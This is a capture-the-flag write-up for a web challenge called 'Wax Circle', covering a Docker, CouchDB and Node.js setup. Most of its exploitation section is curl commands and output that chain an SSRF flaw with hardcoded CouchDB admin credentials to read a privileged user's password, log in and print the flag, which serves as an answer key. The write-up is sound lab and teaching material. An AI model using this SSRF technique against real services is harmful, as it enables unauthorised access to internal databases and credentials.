# Wax Circle CTF Challenge

## 1. Initial Reconnaissance

### Challenge Description

```
Among the ruins of Briarfold, Mira uncovers a gate of tangled brambles and forgotten sigils. Every name carved into its stone has been reversed, letters twisted, meanings erased. When she steps through, the ground blurs—the village ahead is hers, yet wrong: signs rewritten, faces familiar but altered, her own past twisted. Tracing the pattern through spectral threads of lies and illusion, she forces the true gate open—not by key, but by unraveling the false paths the Hollow King left behind.
```

**Goal:** Find the flag.

### File Listing

```
total 8.0K
drwxrwxrwx 1 node node 4.0K Oct 25 04:53 .
drwxrwxrwx 1 node node 4.0K Oct 25 04:49 ..
-rwxrwxrwx 1 node node 2.4K Oct 22 04:39 Dockerfile
-rwxrwxrwx 1 node node  638 Oct 25 04:53 WALKTHROUGH.md
-rwxrwxrwx 1 node node   85 Oct 22 04:39 docker-compose.yml
drwxrwxrwx 1 node node 4.0K Oct 22 04:39 html
drwxrwxrwx 1 node node 4.0K Oct 22 04:39 scripts
```

## 2. Application Analysis

### 2.1 Docker Configuration

**`docker-compose.yml`:**
- Builds the `web` service from the current directory.
- Maps host port `80` to container port `80`.

**`Dockerfile`:**
- Multi-service setup: `Nginx`, `CouchDB`, and a `Node.js` application, managed by `supervisord`.
- **CouchDB Admin Credentials:** `admin:waxcircle2025` (hardcoded in `/opt/couchdb/etc/local.ini`).
- **Flag Location:** `/flag.txt` inside the container.
- Node.js application files are copied from `html/` to `/app`.

### 2.2 Service Orchestration

**`scripts/supervisord.conf`:**
- Manages `couchdb`, `node` (Node.js app), and `nginx` processes.
- Node.js app runs `node server.js` in `/app`.

**`scripts/nginx.conf`:**
- Nginx listens on port `80`.
- All incoming requests (`location /`) are reverse-proxied to `http://127.0.0.1:3000` (Node.js application).
- CouchDB is not directly exposed via Nginx.

### 2.3 Node.js Application Analysis (`html/server.js`)

- Uses `express`, `ejs`, `nano` (for CouchDB), and `jsonwebtoken`.
- **CouchDB Credentials:** `couchdbUrl` hardcodes `http://admin:waxcircle2025@127.0.0.1:5984`.
- **Flag:** `FLAG` variable reads `flag.txt`.
- **`elin_croft` User:** Created with `role: 'guardian'` and `clearance_level: 'divine_authority'`, which are the conditions to display the flag on the dashboard.
- **Login (`/login` POST):** `username` is sanitized, preventing NoSQL injection.
- **JWT (`jsonwebtoken`):** `JWT_SECRET` is randomly generated, making JWT forging impractical.
- **SSRF Vulnerability (`/api/analyze-breach` POST):** Takes a `data_source` URL and uses `axios.get` to fetch its content. This is a Server-Side Request Forgery vulnerability.

## 3. Exploitation

### 3.1 Strategy (SSRF to CouchDB and Flag Retrieval)

1.  **Exploit SSRF to access CouchDB:** Use `/api/analyze-breach` to make the server request CouchDB's internal API with the hardcoded `admin:waxcircle2025` credentials.
    -   First, list all databases (`/_all_dbs`).
    -   Then, query the `users` database to find the document for `elin_croft` (`/users/user_elin_croft`) to extract her randomly generated password.
2.  **Log in as `elin_croft`:** Use the retrieved password for `elin_croft` to log in to the application.
3.  **Retrieve the flag:** Access the `/dashboard` page, where the flag will be displayed due to `elin_croft`'s high authority.

### 3.2 Execution

**1. Log in as the default `guest` user to obtain a session cookie:**

```bash
curl -i -X POST -d "username=guest&password=guest123" http://209.38.220.159:32572/login
```
**Extracted `auth_token`:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidXNlcl9ndWVzdCIsInVzZXJuYW1lIjoiZ3Vlc3QiLCJyb2xlIjoidmlzaXRvciIsImNsZWFyYW5jZV9sZXZlbCI6ImJhc2ljIiwiaWF0IjoxNzYxMzY4MTYwLCJleHAiOjE3NjE0NTQ1NjB9.uQmaFQVTCknkhktXzJ9ygSb3qk5S66b7DAldq1Kjkpc` (This value will vary per instance).

**2. Exploit SSRF to list CouchDB databases:**

```bash
curl -i -X POST -H "Cookie: auth_token=<YOUR_AUTH_TOKEN>" -d "data_source=http://admin:waxcircle2025@127.0.0.1:5984/_all_dbs" http://209.38.220.159:32572/api/analyze-breach
```
**Output (excerpt):** `{"status":"success","data":"[\"users\"]"}`

**3. Exploit SSRF to retrieve `elin_croft`'s user document:**

```bash
curl -i -X POST -H "Cookie: auth_token=<YOUR_AUTH_TOKEN>" -d "data_source=http://admin:waxcircle2025@127.0.0.1:5984/users/user_elin_croft" http://209.38.220.159:32572/api/analyze-breach
```
**Output (excerpt):** `{"status":"success","data":"{\"_id\":\"user_elin_croft\",\"username\":\"elin_croft\",\"password\":\"Q8sPxzi6aZi9igRl\",\"role\":\"guardian\",\"clearance_level\":\"divine_authority\"}"}`

**Extracted `elin_croft` credentials:**
-   **Username:** `elin_croft`
-   **Password:** `Q8sPxzi6aZi9igRl` (This value will vary per instance).

**4. Log in as `elin_croft`:**

```bash
curl -i -X POST -d "username=elin_croft&password=<ELIN_CROFT_PASSWORD>" http://209.38.220.159:32572/login
```
**New `auth_token` for `elin_croft`:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidXNlcl9lbGluX2Nyb2Z0IiwidXNlcm5hbWUiOiJlbGluX2Nyb2Z0Iiwicm9sZSI6Imd1YXJkaWFuIiwiY2xlYXJhbmNlX2xldmVsIjoiZGl2aW5lX2F1dGhvcml0eSIsImlhdCI6MTc2MTM2ODE5NSwiZXhwIjoxNzYxNDU0NTk1fQ.yrukykqN7sJyUXSTk1WUA01QwTbU7zzNmbxtW11auQg` (This value will vary per instance).

**5. Retrieve the flag from the dashboard:**

```bash
curl -i -H "Cookie: auth_token=<ELIN_CROFT_AUTH_TOKEN>" http://209.38.220.159:32572/dashboard
```
**Output (excerpt):**
```html
...
                            <p class="text-green-200 font-mono text-lg font-bold break-all">
                                HTB{w4x_c1rcl3s_c4nn0t_h0ld_wh4t_w4s_n3v3r_b0und_df9ce974cd07944ffb7ad20fcb46c76a}
                            </p>
...
```

## 4. Solution & Flag

**Flag:** `HTB{w4x_c1rcl3s_c4nn0t_h0ld_wh4t_w4s_n3v3r_b0und_df9ce974cd07944ffb7ad20fcb46c76a}`

```